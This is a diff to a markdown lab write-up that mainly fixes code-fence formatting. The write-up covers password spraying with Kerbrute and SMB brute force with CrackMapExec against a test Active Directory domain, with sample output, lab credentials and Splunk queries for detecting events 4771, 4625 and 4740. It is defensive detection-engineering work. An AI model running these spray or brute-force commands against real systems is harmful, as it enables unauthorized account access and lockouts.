@@ -16,9 +16,9 @@ The two techniques generate different events. Spraying via Kerbrute hits the Ker
 
 Before spraying, the domain password policy was pulled using a known credential. This maps to Password Policy Discovery (T1201): an attacker checks the lockout settings to decide how aggressively they can spray without locking accounts.
 
-​`bash
+```bash
 crackmapexec smb 192.168.40.10 -u Administrator -p 'admin@123' --pass-pol
-​`
+```
 
 Key values returned:
 
@@ -41,24 +41,24 @@ Screenshot:
 
 A single common password (`Password@123`) was sprayed across a list of domain users (`users.txt`) using Kerbrute, which authenticates against the Kerberos KDC:
 
-​`bash
+```bash
 kerbrute passwordspray -d corp.local --dc 192.168.40.10 users.txt 'Password@123'
-​`
+```
 
 Kerbrute tested 5 logins and returned 3 valid credentials almost instantly:
 
-​`
+```
 [+] VALID LOGIN: alice.brown@corp.local:Password@123
 [+] VALID LOGIN: finance.user@corp.local:Password@123
 [+] VALID LOGIN: john.smith@corp.local:Password@123
 Done! Tested 5 logins (3 successes) in 0.067 seconds
-​`
+```
 
 One of the valid credentials was then confirmed over SMB with CrackMapExec:
 
-​`bash
+```bash
 crackmapexec smb 192.168.40.10 -u 'john.smith' -p 'Password@123' -d corp.local
-​`
+```
 
 Result: `[+] corp.local\john.smith:Password@123`.
 
@@ -79,11 +79,11 @@ Screenshots:
 
 This is the key teaching point: a spray run through Kerberos shows up as 4771, so a detection that only watches 4625 would miss it entirely.
 
-​`spl
+```spl
 index=* EventCode=4771
 | table _time, Account_Name
 | sort -_time
-​`
+```
 
 This returned failures spread across several different accounts (Administrator, john.smith, finance.user, alice.brown) at near-identical timestamps, which is the signature of spraying.
 
@@ -111,20 +111,20 @@ The original plan was to use Hydra, but it failed against the domain controller 
 
 A short password list (`passwords.txt`) was run against a single account (`john.smith`) over SMB:
 
-​`bash
+```bash
 crackmapexec smb 192.168.40.10 -u john.smith -p passwords.txt -d corp.local
-​`
+```
 
 Failed attempts returned `STATUS_LOGON_FAILURE`; the correct password was marked `[+]`:
 
-​`
+```
 [-] corp.local\john.smith:Summer2024! STATUS_LOGON_FAILURE
 [-] corp.local\john.smith:Welcome1     STATUS_LOGON_FAILURE
 [-] corp.local\john.smith:Admin123     STATUS_LOGON_FAILURE
 [-] corp.local\john.smith:letmein      STATUS_LOGON_FAILURE
 [-] corp.local\john.smith:Password1    STATUS_LOGON_FAILURE
 [+] corp.local\john.smith:Password@123
-​`
+```
 
 ### Detection
 
@@ -132,11 +132,11 @@ Failed attempts returned `STATUS_LOGON_FAILURE`; the correct password was marked
 
 **Event 4740 (account lockout).** With the lockout policy enabled for this test, repeated failures tripped a single 4740 for `john.smith` under User Account Management.
 
-​`spl
+```spl
 index=* (EventCode=4625 OR EventCode=4740)
 | table _time, EventCode, Account_Name
 | sort -_time
-​`
+```
 
 This showed the cluster of 4625 failures for one account followed by the 4740 lockout, all from the same source in a short window.
 
